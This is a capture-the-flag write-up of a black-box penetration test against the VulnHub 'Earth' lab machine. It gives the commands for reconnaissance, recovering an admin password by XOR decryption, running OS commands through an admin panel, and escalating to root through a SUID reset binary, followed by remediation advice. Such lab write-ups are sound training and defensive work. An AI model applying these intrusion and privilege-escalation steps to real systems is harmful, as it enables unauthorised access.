# 🌍 Earth — VulnHub Penetration Test Writeup

> **Black-box CTF | VulnHub | Completed: 27 April 2026**  
> **Author:** bitsniper  
> **Target:** `192.168.1.226` — `earth.local` / `terratest.earth.local`

---

## 📋 Overview

Full black-box penetration test of the [Earth](https://www.vulnhub.com/) VulnHub machine. The engagement covers the external-facing web application and SSH service running on Fedora Linux with Apache 2.4.51, mod_wsgi, and a Django-based messaging application.

Both flags were captured via an 8-step attack chain requiring no advanced exploitation — only enumeration, XOR decryption, and SUID abuse.

---

## 🚩 Flags

| Flag | Hash |
|------|------|
| **User Flag** | `user_flag_3353b67d6437f07ba7d34afd7d2fc270` |
| **Root Flag** | Captured via `/root/root_flag.txt` |

---

## 🔍 Findings Summary

| ID | Title | Severity | CVSS |
|----|-------|----------|------|
| F-001 | XOR Credential Exposure via Public Test Files | 🔴 HIGH | 8.6 |
| F-002 | Admin CLI OS Command Execution | 🔴 HIGH | 8.8 |
| F-003 | SUID Binary Root Password Reset | 🟠 MEDIUM | 6.7 |
| F-004 | Virtual Host Disclosure via SSL SAN | 🟠 MEDIUM | 5.3 |
| F-005 | SSH Root Login Permitted | 🟡 LOW | 3.7 |
| F-006 | Server Version Disclosure | ℹ️ INFO | 0.0 |

---

## ⚔️ Attack Chain

```
[Recon]
  └─ Nmap → ports 22, 80, 443 open

[VHost Discovery]
  └─ SSL cert SAN → earth.local & terratest.earth.local

[File Exposure]
  └─ robots.txt → testingnotes.txt → testdata.txt (XOR key)

[Credential Recovery]
  └─ XOR decrypt → password: earthclimatechangebad4humans

[Admin Access]
  └─ Login terra:earthclimatechangebad4humans → Admin CLI

[User Flag ✅]
  └─ cat /var/earth_web/user_flag.txt

[Privilege Escalation]
  └─ SUID /usr/bin/reset_root + trigger files → root password = Earth

[Root Flag ✅]
  └─ su root → cat /root/root_flag.txt
```

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| Nmap 7.99 | Port/service discovery |
| Gobuster v3.8.2 | Directory enumeration |
| OpenSSL | SSL cert / virtual host analysis |
| curl | Manual HTTP requests |
| Python 3 | XOR decryption script |
| Netcat | Reverse shell testing |

---

## 📖 Detailed Walkthrough

### 1. Reconnaissance

```bash
nmap -sV -sC -p- 192.168.1.226
```

Open ports: **22 (SSH)**, **80 (HTTP)**, **443 (HTTPS)**

### 2. Virtual Host Discovery

Inspecting the SSL certificate reveals two Subject Alternative Names:

```
earth.local
terratest.earth.local
```

Add both to `/etc/hosts`:

```
192.168.1.226  earth.local terratest.earth.local
```

### 3. File Exposure & XOR Decryption (F-001)

`robots.txt` on the staging site exposes `testingnotes.txt`, which discloses:
- Admin username: `terra`
- Encryption: XOR cipher
- Key file: `testdata.txt`

```bash
curl -k https://terratest.earth.local/testingnotes.txt
curl -k https://terratest.earth.local/testdata.txt
```

XOR decrypt the captured ciphertext using Python to recover:

```
Password: earthclimatechangebad4humans
```

### 4. Admin CLI — OS Command Execution (F-002)

Login to `https://earth.local/admin/` with `terra:earthclimatechangebad4humans`.

The admin panel exposes an unrestricted **Admin Command Tool**. Commands execute as `apache (uid=48)`.

```bash
# Retrieve user flag
cat /var/earth_web/user_flag.txt
# → user_flag_3353b67d6437f07ba7d34afd7d2fc270

# Find SUID binaries
find / -perm -4000 -type f
# → /usr/bin/reset_root
```

### 5. Privilege Escalation via SUID Binary (F-003)

```bash
strings /usr/bin/reset_root
# Reveals hardcoded password "Earth" and required trigger files
```

Create the five trigger files in `/tmp`:

```bash
touch /tmp/theEarth /tmp/isflat /tmp/islocalhost /tmp/palblue /tmp/hisflat
```

Execute the binary:

```bash
/usr/bin/reset_root
# → RESETTING ROOT PASSWORD TO: Earth
```

Switch to root and grab the flag:

```bash
su root  # password: Earth
cat /root/root_flag.txt
```

---

## 🔒 Remediation Summary

| Finding | Fix | SLA |
|---------|-----|-----|
| XOR Credential Exposure | Remove test files; use AES-256-GCM + secrets manager | 7 days |
| Admin CLI Command Injection | Remove CLI or implement strict allowlist | 7 days |
| SUID reset_root Binary | `chmod u-s /usr/bin/reset_root` | 30 days |
| SSL Virtual Host Disclosure | Use separate certs per vhost | 30 days |
| SSH Root Login | Set `PermitRootLogin no` in sshd_config | 60 days |
| Version Disclosure | Suppress server headers | 90 days |

---

## ⚠️ Disclaimer

This writeup is for **educational purposes only**. All testing was performed in an isolated lab environment against a VulnHub VM. Do not use these techniques against systems you do not own or have explicit written permission to test.

---

*Generated from pentest report v2 — bitsniper — 27 April 2026*
